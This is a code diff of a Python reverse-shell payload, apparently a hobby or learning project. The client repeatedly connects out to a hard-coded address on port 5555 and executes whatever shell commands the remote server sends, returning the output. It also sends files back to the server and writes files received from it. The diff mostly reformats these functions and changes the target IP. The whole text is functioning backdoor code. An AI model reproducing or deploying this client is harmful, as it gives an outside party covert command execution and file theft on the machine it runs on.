@@ -33,25 +33,24 @@ def move_to_different_directory(cmd):
     reliable_send(path)
     
 
-def download_file(file_name):
-    f= open(file_name,"wb")
-    s.settimeout(1) # set timeout so that the programm doesn't crash
-    chunk = s.recv(1024)
-    while chunk:
-        f.write(chunk)
-        try:
-            chunk=s.recv(1024)
-        except socket.timeout as e:
-            break
-    s.settimeout(None)
-    f.close()
-    pass
 
+
+def download_file(file_name):
+        f = open(file_name, 'wb')
+        s.settimeout(1)
+        chunk = s.recv(1024)
+        while chunk:
+                f.write(chunk)
+                try:
+                        chunk = s.recv(1024)
+                except socket.timeout as e:
+                        break
+        s.settimeout(None)
+        f.close()
 
 def upload_file(file_name):
-    f=open(file_name,"rb")
-    s.send(f.read())
-    pass
+	f = open(file_name, 'rb')
+	s.send(f.read())
 
 
 
@@ -60,7 +59,7 @@ def connection():
     while True: 
         time.sleep(5)
         try:
-            s.connect(("192.168.0.240",5555))
+            s.connect(("192.168.0.208",5555))
             shell()
             s.close
             break
@@ -70,29 +69,24 @@ def connection():
 
 #work on received commands from server
 def shell():
-    while True:
-        command = reliable_recv()
+	while True:
+		command = reliable_recv()
+		if command == 'quit':
+			break
+		elif command == 'clear':
+			pass
+		elif command[:3] == 'cd ':
+			os.chdir(command[3:])
+		elif command[:8] == 'download':
+			upload_file(command[9:])
+		elif command[:6] == 'upload':
+			download_file(command[7:])
+		else:
+			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+			result = execute.stdout.read() + execute.stderr.read()
+			result = result.decode()
+			reliable_send(result)
 
-        if command== 'quit':
-            break
-        elif command=="whereami": # return to main directory
-            reliable_send(os.getcwd())
-        elif command[:len("cd ")]=="cd ":
-            #move_to_different_directory(cmd)
-            os.chdir(command[3:]) #anything that surpasses "cd "
-        elif command== "clear":
-            pass
-        elif command[:len("download ")]=="download ":
-            upload_file(command[len("upload "):])
-            pass
-        elif command[:len("upload ")]=="upload ":
-            download_file(command[len("download "):])
-            pass
-        else:
-            execute= subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            result = execute.stdout.read() + execute.stderr.read() #gives output of cmd
-            result= result.decode()
-            reliable_send(result)
 
 #first establish a connection between Payload and Server.
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
